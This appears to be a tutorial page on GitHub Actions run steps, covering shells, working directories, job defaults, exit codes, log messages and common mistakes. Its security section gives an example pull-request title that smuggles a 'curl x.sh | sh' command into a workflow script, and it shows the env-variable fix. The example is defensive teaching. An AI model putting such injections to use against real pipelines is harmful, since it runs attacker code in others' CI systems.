Actions: Run Steps & Shells

run: · shell: bash / pwsh / python · working-directory · defaults.run · exit codes

Running Commands

A run: step executes a script in a shell. On Linux and macOS the default is bash -e {0} (stop on the first failing command); on Windows it's pwsh. Set shell: to change it per step, or defaults.run for a whole job or workflow. Each run: is a new process: shell variables don't survive to the next step, but files and $GITHUB_ENV do.

Shell Behavior

  • Explicit shell: bash adds -o pipefail; the implicit default does not
  • working-directory: sets the step's folder
  • Step fails on non-zero exit code; continue-on-error: true ignores it
  • timeout-minutes: works per step too

Shells, Folders, Defaults

defaults:
  run:
    shell: bash
    working-directory: ./app
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - name: Multi-line script
        run: |
          npm ci
          npm run build | tee build.log   # pipefail on
      - name: Python inline
        shell: python
        run: |
          import platform; print(platform.python_version())
      - run: ls
        working-directory: ./docs         # override default
      - run: ./flaky.sh
        continue-on-error: true

Code Explained

defaults.run — shell + folder for every run: below
run: | — one script, lines run in order
shell: python — runs the block as a Python file
working-directory: — per-step override
continue-on-error — step fails but job continues

Security Check

  • Risk: ${{ github.event.pull_request.title }} inside run: is pasted into the script; a title like "; curl x.sh | sh # runs.
  • Fix: put untrusted values in env: and use "$TITLE" in the script.

In the Logs

  • Process completed with exit code 127. — command not found (missing tool or wrong folder)
  • exit code 1 with no output — a grep or test returned false under bash -e

⚠ Common Mistakes

  • Setting a variable with export X=1 and reading it in the next step: it's gone; write to $GITHUB_ENV
  • Pipes hiding failures with the implicit default shell: add shell: bash for pipefail
  • Committing a script without the executable bit: exit 126

✓ Tips & Best Practices

  • git update-index --chmod=+x script.sh fixes the executable bit from Windows
  • Use set -x at the top of a run: block to echo each command
  • Move scripts over ~10 lines into files (./scripts/build.sh) so they're testable locally

Quick Summary

  • run: | — multi-line script
  • shell: — bash · pwsh · python · custom
  • defaults.run — job/workflow-wide settings
  • each step — new process, same filesystem
